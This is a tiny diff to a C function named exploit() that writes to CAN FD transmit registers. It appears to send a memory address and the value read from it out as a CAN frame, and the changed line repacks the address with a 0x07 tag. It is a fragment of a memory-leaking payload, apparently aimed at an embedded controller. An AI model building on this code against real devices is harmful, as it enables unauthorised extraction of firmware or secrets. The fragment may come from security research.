@@ -25,7 +25,7 @@ void exploit() {
         *(RSCFDnCFDTMIDp + 8 * i) = 0x7a9;
 
         // Data
-        *(RSCFDnCFDTMDF0_p + 8 * i) = addr;
+        *(RSCFDnCFDTMDF0_p + 8 * i) = ((int)addr << 8) | 0x07;
         *(RSCFDnCFDTMDF1_p + 8 * i) = *addr;
 
         // Classical frame
